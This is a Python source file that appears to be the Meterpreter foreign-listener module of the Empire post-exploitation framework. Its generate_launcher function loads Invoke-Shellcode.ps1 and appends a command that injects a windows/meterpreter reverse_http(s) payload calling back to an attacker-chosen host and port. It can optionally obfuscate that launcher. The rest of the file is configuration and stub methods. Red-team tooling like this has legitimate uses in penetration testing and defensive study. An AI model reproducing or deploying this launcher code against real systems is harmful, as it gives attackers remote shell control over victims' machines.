# Empire imports
from lib.common import helpers


class Listener:

    def __init__(self, mainMenu, params=[]):

        self.info = {
            'Name': 'Meterpreter',

            'Author': ['@harmj0y'],

            'Description': ("Starts a 'foreign' http[s] Meterpreter listener."),

            'Category' : ('client_server'),

            'Comments': []
        }

        # any options needed by the stager, settable during runtime
        self.options = {
            # format:
            #   value_name : {description, required, default_value}

            'Name' : {
                'Description'   :   'Name for the listener.',
                'Required'      :   True,
                'Value'         :   'meterpreter'
            },
            'Host' : {
                'Description'   :   'Hostname/IP for staging.',
                'Required'      :   True,
                'Value'         :   "http://%s:%s" % (helpers.lhost(), 80)
            },
            'Port' : {
                'Description'   :   'Port for the listener.',
                'Required'      :   True,
                'Value'         :   80
            }
        }

        # required:
        self.mainMenu = mainMenu
        self.threads = {}


    def default_response(self):
        """
        Nothing needed to return here, as we're not actually starting the listener.
        """
        return ''


    def validate_options(self):
        """
        Validate all options for this listener.
        """

        for key in self.options:
            if self.options[key]['Required'] and (str(self.options[key]['Value']).strip() == ''):
                print helpers.color("[!] Option \"%s\" is required." % (key))
                return False

        return True


    def generate_launcher(self, encode=True, obfuscate=False, obfuscationCommand="", userAgent='default', proxy='default', proxyCreds='default', stagerRetries='0', language=None, safeChecks='', listenerName=None):
        """
        Generate a basic launcher for the specified listener.
        """

        if not language or language.lower() != 'powershell':
            print helpers.color('[!] listeners/http generate_launcher(): only PowerShell is supported at this time')
            return None
        
        if listenerName and (listenerName in self.mainMenu.listeners.activeListeners):

            # extract the set options for this instantiated listener
            listenerOptions = self.mainMenu.listeners.activeListeners[listenerName]['options']
            host = listenerOptions['Host']['Value']

            moduleSourcePath = "%s/data/module_source/code_execution/Invoke-Shellcode.ps1" % (self.mainMenu.installPath)

            try:
                f = open(moduleSourcePath, 'r')
            except:
                print helpers.color("[!] Could not read module source path at: %s" % (moduleSourcePath))
                return ''
            script = f.read()
            f.close()

            msfPayload = 'windows/meterpreter/reverse_http'
            if 'https' in host:
                msfPayload += 's'
            
            if 'http' in host:
                parts = host.split(':')
                host = parts[1].strip('/')
                port = parts[2].strip('/')

            script = helpers.strip_powershell_comments(script)
            script += "\nInvoke-Shellcode -Payload %s -Lhost %s -Lport %s -Force" % (msfPayload, host, port)
            if obfuscate:
                script = helpers.obfuscate(self.mainMenu.installPath, script, obfuscationCommand=obfuscationCommand)
            return script

        else:
            print helpers.color("[!] listeners/meterpreter generate_launcher(): invalid listener name specification!")


    def generate_stager(self, encode=False, encrypt=True, obfuscate=False, obfuscationCommand="", language=None):
        """
        Nothing to actually generate here for foreign listeners.
        """
        print "generate_stager() not applicable for listeners/meterpreter"
        pass


    def generate_agent(self, language=None, obfuscate=False, obfuscationCommand=""):
        """
        Nothing to actually generate here for foreign listeners.
        """
        print "generate_stager() not applicable for listeners/meterpreter"
        pass


    def generate_comms(self, language=None):
        """
        Generate just the agent communication code block needed for communications with this listener.

        This is so agents can easily be dynamically updated for the new listener.

        TODO: same generate_comms() as listeners/meterpreter, just different server config...
        """

        if language:
            if language.lower() == 'powershell':
                # generate Get-Task / Send-Message
                pass
            elif language.lower() == 'python':
                # send_message()
                pass
            else:
                print helpers.color("[!] listeners/meterpreter generate_comms(): invalid language specification, only 'powershell' and 'python' are current supported for this module.")
        else:
            print helpers.color('[!] listeners/meterpreter generate_comms(): no language specified!')


    def start(self, name=''):
        """
        Nothing to actually start for a foreign listner.
        """
        return True


    def shutdown(self, name=''):
        """
        Nothing to actually shut down for a foreign listner.
        """
        pass
